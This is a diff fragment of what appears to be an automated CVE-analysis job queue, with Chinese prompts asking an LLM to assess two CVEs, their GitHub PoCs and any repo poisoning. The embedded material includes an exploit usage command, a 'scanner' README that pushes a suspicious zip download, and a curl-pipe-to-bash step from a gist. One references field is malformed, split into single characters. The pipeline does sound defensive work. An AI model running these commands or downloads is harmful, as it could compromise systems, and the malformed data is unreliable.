-l targets.txt -c \"whoami\" -t 10 # With proxy python3 CVE-2025-55182-Exp.py -u http://target:3000 -c \"id\" --proxy http://127.0.0.1:8080\n [link] https://github.com/imbas007/POC-CVE-2025-55182\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - acheong08/CVE-2025-55182-poc: Actual CVE-2025-55182 detection and exploit. No bullshit LLMs. · GitHub\n [description] React Flight protocol vulnerability allowing prototype chain traversal via chunk references.\n [link] https://github.com/acheong08/CVE-2025-55182-poc\n [webpage 3 end]\n[webpage 4 begin] [title] cve-2025-55182 · GitHub Topics · GitHub\n [description] 🚨 Exploit CVE-2025-55182, a critical RCE vulnerability in React Server Components for Next.js apps; enables testing for prototype pollution risks. react python exploit scanner nextjs poc rce vulnerability exp massive dify react-server-component ...\n [link] https://github.com/topics/cve-2025-55182?o=desc&s=updated\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/LICENSE\n---\nMIT License\n\nCopyright (c) 2025 Vicky\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/README.md\n---\n# 🔍 CVE-2025-55182-Scanner - Detect and Secure Your Applications\n\n## 🌟 Overview\nCVE-2025-55182-Scanner is a hybrid security scanner designed to help you identify vulnerabilities in https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip and Waku applications. This tool combines static code analysis with safe dynamic verification, making it ideal for DevSecOps workflows. Whether you’re a developer or just a concerned user, this scanner will help you secure your applications against potential threats.\n\n## 🚀 Getting Started\nTo get started with CVE-2025-55182-Scanner, follow these simple steps:\n\n1. **Visit the Releases Page:** Click the button below to go to the GitHub Releases page.\n\n   [![Download CVE-2025-55182-Scanner](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip%20Now!-CVE-2025--55182--Scanner-blue)](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip)\n\n2. **Download the Latest Version:** On the Releases page, find the latest version of the application. Look for files named with the application version (e.g., https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Click the file to download it to your computer.\n\n3. **Install the Application:** After downloading, locate the file on your computer. Double-click the file to start the installation process. Follow the prompts to complete the installation.\n\n4. **Run the Scanner:** Once installed, you can start CVE-2025-55182-Scanner from your applications list. \n\n5. **Begin Scanning:** Input the necessary details of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application and click \"Scan.\" The scanner will analyze your project for vulnerabilities.\n\n## ⚙️ System Requirements\n- **Operating System:** Windows 10 or later, macOS Mojave or later, or a 64-bit version of Linux.\n- **RAM:** At least 4 GB of RAM.\n- **Disk Space:** Minimum of 500 MB free space for installation.\n- **Network:** Internet connection recommended for updates and additional resources.\n\n## 📥 Download & Install\nTo download CVE-2025-55182-Scanner, please revisit the [Releases page](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Start by clicking the link above. Choose the version that suits your operating system and download it.\n\n1. **Download the File:** Click on the appropriate file for your operating system to initiate the download.\n2. **Install the Application:** Follow the on-screen instructions to install the software.\n3. **Open the Software:** You will find CVE-2025-55182-Scanner in your application menu or desktop.\n\n## 🔒 Features\n- **Static Code Analysis:** Scan your code for vulnerabilities without running the application.\n- **Dynamic Verification:** Run the app in a safe environment to perform real-time checks for security issues.\n- **User-Friendly Interface:** Designed for non-technical users to easily navigate and operate.\n- **Reports and Recommendations:** Get detailed reports about vulnerabilities found and recommendations for fixes.\n\n## 📊 Usage Instructions\nAfter installation, you can follow these steps to effectively use CVE-2025-55182-Scanner:\n\n1. **Open the Application:** Launch CVE-2025-55182-Scanner from your computer.\n2. **Input Application Details:** Enter the URL or path of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application.\n3. **Choose Scan Type:** Select either \"Static Analysis\" or \"Dynamic Verification\" based on your requirements.\n4. **Start Scan:** Click the \"Scan\" button to begin the process. Wait for the scan to complete.\n5. **Vi\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n      ,
+    "retry_count": 3,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1786060276.4867766,
-    "last_attempt": 1786060296.6189075,
-    "next_attempt": 1786060315.0665543,
+    "last_attempt": 1786068620.8084116,
+    "next_attempt": 1786068653.1222246,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1786060276",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-64561",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-64561\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"In the Linux kernel, the following vulnerability has been resolved:\\n\\nKVM: x86: Check for invalid/obsolete root *after* making MMU pages available\\n\\nCheck for a \\\"stale\\\" page fault, i.e. for an invalid and/or obsolete root,\\nafter making MMU pages available for the shadow MMU.  If reclaiming shadow\\npages zaps an in-use root, i.e. marks it invalid, then KVM will attempt to\\nmap memory into an invalid root.  On its own, populating an invalid root is\\n\\\"fine\\\", but because child shadow pages inherit their parent's role, any\\nchildren created during the map/fetch will be created as invalid pages,\\nthus violating KVM's invariant that invalid pages are never on the list of\\nactive MMU pages.\\n\\nNote, the underlying flaw has existed since KVM first started tracking\\ninvalid roots in 2008 (commit 2e53d63acba7, \\\"KVM: MMU: ignore zapped root\\npagetables\\\"), but the true badness only came along in 2020 (Linux 5.9)\\nwith the invariant that invalid shadow pages can't be on the list of\\nactive pages.\\n\\nNote #2, inheriting role.invalid when creating child shadow pages is also\\nfar from ideal; that flaw will be addressed separately.\", \"\\u6807\\u9898: Linux \\u5185\\u6838 KVM x86 MMU \\u5f71\\u5b50\\u9875\\u9648\\u65e7\\u6839\\u68c0\\u67e5\\u65f6\\u5e8f\\u6f0f\\u6d1e\"], \"published_date\": \"2026-08-04T07:16:30.937\", \"last_modified_date\": \"2026-08-04T07:16:30.937\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"0\", \"0\", \"2\", \"6\", \"d\", \"b\", \"b\", \"7\", \"d\", \"e\", \"8\", \"e\", \"a\", \"7\", \"6\", \"e\", \"9\", \"7\", \"d\", \"6\", \"e\", \"d\", \"f\", \"4\", \"2\", \"f\", \"c\", \"3\", \"c\", \"c\", \"0\", \"8\", \"4\", \"5\", \"6\", \"4\", \"e\", \"2\", \"b\", \"f\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"2\", \"a\", \"b\", \"d\", \"5\", \"2\", \"8\", \"7\", \"f\", \"0\", \"8\", \"3\", \"1\", \"9\", \"f\", \"a\", \"3\", \"5\", \"7\", \"6\", \"4\", \"5\", \"6\", \"6\", \"b\", \"1\", \"5\", \"c\", \"6\", \"e\", \"2\", \"2\", \"c\", \"b\", \"1\", \"0\", \"6\", \"8\", \"d\", \"b\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"3\", \"5\", \"e\", \"7\", \"7\", \"4\", \"6\", \"7\", \"6\", \"1\", \"0\", \"c\", \"4\", \"a\", \"3\", \"7\", \"c\", \"b\", \"0\", \"f\", \"f\", \"5\", \"4\", \"e\", \"e\", \"5\", \"6\", \"b\", \"8\", \"5\", \"f\", \"7\", \"3\", \"b\", \"1\", \"f\", \"5\", \"7\", \"0\", \"0\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"b\", \"c\", \"e\", \"0\", \"d\", \"3\", \"c\", \"2\", \"6\", \"e\", \"2\", \"c\", \"7\", \"6\", \"1\", \"a\", \"4\", \"b\", \"f\", \"4\", \"3\", \"c\", \"8\", \"9\", \"4\", \"9\", \"f\", \"3\", \"3\", \"3\", \"f\", \"c\", \"7\", \"3\", \"7\", \"4\", \"e\", \"b\", \"2\", \"d\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"t\", \"a\", \"b\", \"l\", \"e\", \"/\", \"c\", \"/\", \"f\", \"3\", \"4\", \"7\", \"7\", \"a\", \"6\", \"a\", \"4\", \"1\", \"6\", \"4\", \"f\", \"1\", \"5\", \"2\", \"8\", \"7\", \"4\", \"4\", \"4\", \"e\", \"d\", \"a\", \"6\", \"8\", \"5\", \"b\", \"5\", \"f\", \"6\", \"4\", \"0\", \"5\", \"d\", \"b\", \"d\", \"1\", \"e\", \"5\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Zapscape (CVE-2026-64561) — elseif\n [description] Zapscape (CVE-2026-64561) is a use-after-free bug in KVM’s shadow MMU that lets a guest VM execute code with root privileges on the host.\n [link] https://www.elseif.net/stories/zapscape-cve-2026-64561-1df0ed5\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-64561 - KVM: x86: Check for invalid/obsolete root *after...\n [description] The following products are affected by CVE-2026-64561 vulnerability.Rebuild and deploy the updated kernel. Verify system stability and security. We scan GitHub repositories to detect new proof-of-concept exploits.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-64561\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-64561 — Linux Linux | dbugs\n [description] Details on CVE-2026-64561: Linux Linux. Includes CVSS score, affected versions, and references.\n [link] https://dbugs.ptsecurity.com/vulnerability/PT-2026-67668\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-64561 - Red Hat Customer Portal\n [description] CVE-2026-64561. Description. A flaw was found in KVM in the Linux kernel.Common Vulnerability Scoring System (CVSS) Score Details. Info alert:Important note. CVSS scores for open source components depend on vendor-specific factors (e.g. version or build chain).\n [link] https://access.redhat.com/security/cve/cve-2026-64561\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-64561\n [description] CVE-2026-64561. Name. CVE-2026-64561. Description. In the Linux kernel, the following vulnerability has been resolved: K ...\n [link] https://security-tracker.debian.org/tracker/CVE-2026-64561\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/73c3f516cc52c3c0178a2238d62556fc/LICENSE\n---\nSECURITY RESEARCH LICENSE (SRL-1.0)\n\nCopyright (c) 2026\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to use,\ncopy, modify, and distribute the Software, subject to the following conditions:\n\n---\n\n## 1. Permitted Use\n\nThe Software is provided solely for:\n\n- Educational purposes\n- Academic research\n- Controlled cybersecurity testing\n- Vulnerability analysis in isolated environments\n- Defensive security improvement and learning\n\nUse is permitted only in environments where the user has explicit authorization.\n\n---\n\n## 2. Strict Prohibitions\n\nYou MAY NOT use this Software for any of the following:\n\n- Unauthorized access to systems, networks, or services\n- Exploitation of production or live environments\n- Malicious hacking, intrusion, or data exfiltration\n- Illegal, unethical, or harmful activities of any kind\n- Any activity that violates applicable local, national, or international laws\n\nAny such use is strictly outside the scope of this license.\n\n---\n\n## 3. No Warranty\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,\nINCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\nPARTICULAR PURPOSE, AND NONINFRINGEMENT.\n\nIN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY CLAIM, DAMAGES,\nOR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE,\nARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n\n---\n\n## 4. Limitation of Liability\n\nThe author and contributors of this Software:\n\n- Are NOT responsible for any misuse of the Software\n- Are NOT liable for any damages, losses, or legal consequences\n- Do NOT endorse or authorize any illegal or malicious use\n- Accept NO responsibility for how the Software is used, modified, or distributed\n\nUsers are solely responsible for their actions and compliance with applicable laws.\n\n---\n\n## 5. Security Research Disclaimer\n\nThis Software is intended exclusively for security research and defensive purposes.\nIt is designed to help understand vulnerabilities and improve system security.\n\nIt must NOT be used against systems without explicit written permission.\n\n---\n\n## 6. Responsibility of the User\n\nBy using this Software, you agree that:\n\n- You are legally authorized to perform all testing activities\n- You will use the Software only in controlled environments\n- You will comply with all applicable laws and regulations\n- You assume full responsibility for any consequences of your use\n\n---\n\n## 7. Termination of Use\n\nAny violation of this license automatically terminates your rights to use,\nmodify, or distribute the Software.\n\n---\n\n## 8. Final Statement\n\nThis Software is provided for ethical cybersecurity research only.\nAny misuse is strictly prohibited and is solely the responsibility of the user.\n\n---\n/tmp/73c3f516cc52c3c0178a2238d62556fc/README.md\n---\n# CVE-2026-64561\n\n## Donate\n\nSupport the maintenance of this project with PayPal or by scanning the QR code below.\n\n[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/donate/?hosted_button_id=GHBZLGLY76KNA)\n\n<p>\n  <img src=\"https://raw.githubusercontent.com/HORKimhab/awesome-cybersecurity-resources/refs/heads/main/data/images/aba-merchant-hkimhab.jpeg\" alt=\"QR code for donation\" height=\"180\">\n</p>\n\n## ⚡ Simple Usage\n\nUse this project only in safe and authorized environments such as:\n\n- Local virtual machines\n- Docker containers\n- Isolated lab setups\n- Authorized penetration testing environments\n\nExample setup:\n\n```bash\ngit clone <repository-url>\ncd <repository-name>\n\n# Project use python follow below\n\n# Create a virtual environment\npython -m venv venv\n\n# Activate the virtual environment\n\n# macOS / Linux\nsource venv/bin/activate\n\n# Windows (Git Bash / WSL)\nsource venv/Scripts/activate\n\n# Install requirments\npip install -r requirements.txt\n\n```\n\nExample usage:\n\n```bash\n# Install dependencies\n<install-command>\n\n# Run the project\n<run-command>\n\n# Replace the commands above with your actual project setup steps.\n```\n\nNote: \n\n- clone from other project you must run `curl -fsSL https://gist.githubusercontent.com/HORKimhab/24c89ee9a86a42aac88381334f8bfe48/raw | bash -s -- -y` to clear nested dir .git\n- e.g: cve-2025-46822.sh, cve-2025-46822-lab.sh, ...\n\n---\n## Credit or Reference\n\n- Zapscape-V4bel: https://github.com/V4bel/Zapscape\n\n---\n\n# 📚 Educational Security Research Repository\n\nA repository for learning, testing, and researching cybersecurity concepts in controlled environments.\n\n---\n\n## ⚠️ Security & Legal Disclaimer\n\n## Purpose\n\nThis repository is for **educational and authorized security research only**.\n\nIt is designed to help users learn about:\n\n- Security vulnerabilities\n- Sandbox and isolation concepts\n- Secure coding and defensive practices\n\n---\n\n## Authorized Use Only\n\nUse this repository only in environments w\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+ ,
+    "retry_count": 0,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": null,
+    "last_error": null,
+    "created_at": 1786068620.8017929,
+    "last_attempt": 0,
+    "next_attempt": 1786068626.2898026,
+    "metadata": {},
+    "task_id": "task_CVE-2026-64561_1786068620",
     "required_result_fields": [
       "poc_available",
       "condition",
